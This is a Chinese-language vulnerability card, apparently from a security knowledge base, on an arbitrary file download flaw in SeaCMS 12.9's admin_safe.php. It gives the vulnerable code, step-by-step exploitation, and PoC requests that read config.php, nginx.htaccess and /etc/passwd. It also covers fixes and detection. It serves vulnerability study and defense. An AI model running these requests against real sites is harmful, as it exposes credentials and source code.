---
id: web-generic-file-inclusion-seacms-admin-safe-arbitrary-file-download
title: SeaCMS 12.9 后台 admin_safe.php download 未校验 file：绝对路径任意文件下载/读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: seacms-admin-safe-arbitrary-file-download
aliases:
- 海洋CMS admin_safe 任意文件下载
- SeaCMS 任意文件读取
- admin_safe.php?action=download
- file_get_contents file 参数
- 下载 nginx.htaccess
tags:
- php
- seacms
- cms
- backend
- file-read
- arbitrary-file-download
- information-disclosure
cve: []
severity: medium
confidence: high
status: verified
affected_versions: SeaCMS 12.9（原文版本）
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T00:49:27+08:00'
  notes: 已对照原文与 img/04/06（nginx.htaccess 下载记录）核对：admin_safe.php action=download 直接 file_get_contents($_GET['file'])，无目录/后缀限制，可读绝对路径与 ../；PoC 与原文一致。已修正正文『八进制流』为字节流(application/octet-stream)。未复跑目标。dedup 候选 download-param-source-disclosure 为通用同 sink 卡，本卡为 SeaCMS 具体入口，保留。
---

## 一句话结论

SeaCMS 12.9 后台 `admin_safe.php` 的 `action=download` 分支从 `$_GET['file']` 取路径后直接 `file_get_contents($file)` 并回显，既不限制目录也不做白名单；拥有后台会话的攻击者可提交绝对路径（如 `D:\phpstudy_pro\WWW\seacms-12_9\nginx.htaccess`）下载任意文件，读取配置、源码、数据库凭据或系统文件。

## 原理

- 漏洞代码（原文）：
  ```php
  if($action=="download" && isset($_GET['file']) && trim($_GET['file'])!="")
  {
     $file = $_GET['file'];
     ob_clean();
     if (@file_exists($file)) {
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".basename($file)."\"");
        echo file_get_contents($file);
     }
     exit();
  }
  ```
- `file` 参数没有 `realpath`/基目录限制/后缀白名单，`file_exists` 与 `file_get_contents` 接受任意可读路径（含 Windows 绝对路径与 `../` 相对路径），因此是任意文件读取；`basename($file)` 只影响下载文件名，不限制读取目标。
- 读取 PHP 源码时不会执行，直接把源码作为字节流（`application/octet-stream`）返回；读取 `nginx.htaccess`、`config.php`、`data/` 下配置可获取数据库账号、后台路径、加密密钥等后续利用信息。
- 入口位于后台（admin_safe.php），需要管理员会话；但该功能本身是“安全设置/文件查看”类页面，后台低权限或弱口令场景也可能触达。

## 触发条件

- SeaCMS 12.9（原文版本）。
- 攻击者拥有后台管理员会话（或后台鉴权可绕过）。
- Web 进程对目标文件有读权限（配置文件、源码通常可读）。
- `admin_safe.php` 的 `action=download` 分支可用（默认部署）。

## 利用步骤

1. 登录后台，访问 `admin/admin_safe.php`（后台目录可能被重命名，如原文 `/p8qca/`）。
2. 构造下载请求，`file` 使用目标文件的绝对路径或相对路径：
   ```text
   GET /admin/admin_safe.php?action=download&file=D:\phpstudy_pro\WWW\seacms-12_9\nginx.htaccess
   ```
3. 服务端返回 `application/octet-stream`，浏览器下载 `nginx.htaccess`（原文下载记录截图）。
4. 依次读取 `config.php`、`data/` 配置、`admin/` 源码，收集数据库凭据、后台路由与可用 gadget；也可读取系统文件。
5. 若目标为 Linux，用 `/etc/passwd`、`/var/www/.../config.php` 等路径验证。

## PoC

```http
GET /admin/admin_safe.php?action=download&file=D%3A%5Cphpstudy_pro%5CWWW%5Cseacms-12_9%5Cnginx.htaccess HTTP/1.1
Host: target
Cookie: <admin session>
```

```http
GET /admin/admin_safe.php?action=download&file=../config.php HTTP/1.1
Host: target
Cookie: <admin session>
```

## 变体与关联

- 变体：`../` 相对路径、Windows 盘符绝对路径、`\\server\share` UNC 路径；读取 `.htaccess`/`nginx.conf`/`config.php`/`data/*_safe.txt` 等。
- 变体：读取到数据库配置后可进一步连接数据库（若端口可达），或结合后台 SQL 执行/写文件功能扩大影响。
- 关联：[[web-generic-file-inclusion-download-param-source-disclosure]]（通用“下载参数原样读文件”模式，本卡为 SeaCMS 后台实例）、[[web-generic-file-inclusion-windows-backslash-download-traversal]]（Windows 反斜杠下载穿越）；同篇 SeaCMS 卡见 admin_ping 代码执行、admin_datarelate SQL 执行、dmku 未授权 SQLi。

## 检测与防御

- 修复：`file` 只接受白名单文件名或相对基目录路径，使用 `realpath` 校验结果仍在允许目录内；禁止绝对路径与 `..`；下载接口单独鉴权。
- 运行：后台目录改名 + IP 白名单/二次认证；Web 进程最小权限；敏感配置文件放在 Web 根外。
- 检测：监控 `admin_safe.php?action=download` 的 `file` 参数出现盘符、`..`、`config`、`.htaccess` 等；审计后台下载日志与异常的大文件/源码下载。
- 清理：检查被读取的凭据是否已用于进一步攻击；轮换数据库与后台密码；修复后删除暴露的备份/配置文件。
